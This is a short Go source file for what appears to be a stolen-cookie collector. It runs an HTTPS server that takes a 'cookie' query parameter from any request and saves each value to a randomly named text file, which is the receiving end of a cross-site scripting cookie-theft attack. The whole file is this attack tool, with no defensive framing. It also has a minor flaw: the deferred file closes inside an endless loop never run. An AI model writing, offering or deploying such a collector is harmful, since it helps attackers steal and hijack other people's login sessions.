package main

import (
	"crypto/md5"
	"fmt"
	"log"
	"net/http"
	"os"
	"time"
)

func randomMd5() string {
	md5 := md5.New()
	md5.Write([]byte(fmt.Sprintf("%d", time.Now().UnixNano())))
	return fmt.Sprintf("%x", md5.Sum(nil))
}

func main() {
	channel := make(chan string)
	handler := http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		cookie := r.URL.Query().Get("cookie")
		if cookie != "" {
			channel <- cookie
		}
	})
	go func() {
		for {
			select {
			case cookie := <-channel:
				file := fmt.Sprintf("%s.txt", randomMd5())
				log.Printf("Writing cookie to %s file\n", file)
				// Write cookie to file
				fileDescriptor, err := os.Create(file)
				if err != nil {
					log.Printf("Error creating file: %s", err)
					continue
				}
				defer fileDescriptor.Close()
				_, err = fileDescriptor.WriteString(cookie)
				if err != nil {
					log.Printf("Error writing to file: %s", err)
					continue
				}
			}
		}
	}()
	log.Fatal(http.ListenAndServeTLS(":8080", "localhost.crt", "localhost.key", handler))
}
